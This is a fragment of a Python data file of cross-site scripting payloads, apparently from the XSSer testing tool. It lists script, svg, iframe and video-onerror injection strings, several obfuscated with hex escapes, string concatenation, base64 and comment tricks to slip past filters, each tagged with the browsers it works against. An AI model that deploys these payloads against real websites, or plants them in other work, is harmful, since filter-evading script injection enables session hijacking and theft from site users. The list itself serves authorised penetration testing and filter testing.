...
""",
                ...
                { 'payload':"""<video onerror="javascript:PAYLOAD"><source>""",
                  'browser':"""[HTML5 Injection]"""},
		{ 'payload' : """?a=<script>/*//&b=*/alert('XSSer');</script>""",
		  'browser' : """[GCHOMRE20.0][FF13.0]"""},
		{ 'payload' : """<script>window["alert"]("XSSer")/*&x=?*/;</script>""",
		  'browser' : """[FF13.0]"""},
		{ 'payload' : """<script>/*//&x=*/this['ale'+'\x72\x74']('XSSer');</script>""",
		  'browser' : """[FF13.0]"""},
		{ 'payload' : """?x=<script>/*//&b=*/this["alert"]("XSSer");</script>""",
		  'browser' : """[GCHROME20.0][FF|13.0]"""},
		{ 'payload' : """<script>/*//&x=*/window['\x61\x6c\x65\x72\x74']('XSSer')</script>""",
		  'browser' : """[GCHROME20.0][FF13.0]"""},
		{ 'payload':"""</title><script>window["alert"](/XSSer/.source)</script>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		{ 'payload':"""<iframe///////onload=alert(/XSSer/)></iframe>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		{ 'payload':"""<script>alert(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		{ 'payload':"""<script>/*</script*>*/alert(/XSSer/)</script>""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		{ 'payload':"""</script>"//'//<svg%0Aonload=alert(/XSSer/)//""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		{ 'payload':"""</script><svg onload='-/"/-alert(/XSSer/)//'""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""}
]

vectors_css = [ { 'payload' : """<style>*{background:red;}</style>""",
                  'browser' : """At all browser ;)"""},
